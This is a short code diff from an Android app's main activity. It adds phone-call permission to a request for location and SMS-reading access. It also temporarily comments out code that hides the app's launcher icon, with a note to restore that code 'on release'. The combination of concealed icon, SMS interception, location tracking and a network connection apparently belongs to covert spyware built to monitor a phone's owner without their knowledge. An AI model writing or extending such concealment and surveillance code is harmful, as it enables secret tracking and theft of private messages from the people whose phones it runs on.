@@ -62,7 +62,8 @@ public class MainActivity extends AppCompatActivity {
                         Manifest.permission.ACCESS_COARSE_LOCATION,
                         Manifest.permission.ACCESS_FINE_LOCATION,
                         Manifest.permission.READ_SMS,
-                        Manifest.permission.RECEIVE_SMS
+                        Manifest.permission.RECEIVE_SMS,
+                        Manifest.permission.CALL_PHONE
                 }, RQ_CODE_RQ_PERMISSIONS);
             } else {
                 doNormalWork();
@@ -184,10 +185,10 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onStop() {
 
-        //Hiding launcher icon
+       /* //TODO: Un comment on release . Hiding launcher icon
         PackageManager p = getPackageManager();
         ComponentName componentName = new ComponentName(this, MainActivity.class);
-        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);*/
 
         OkHttpUtils.cancelCall(connectCall);
         super.onStop();
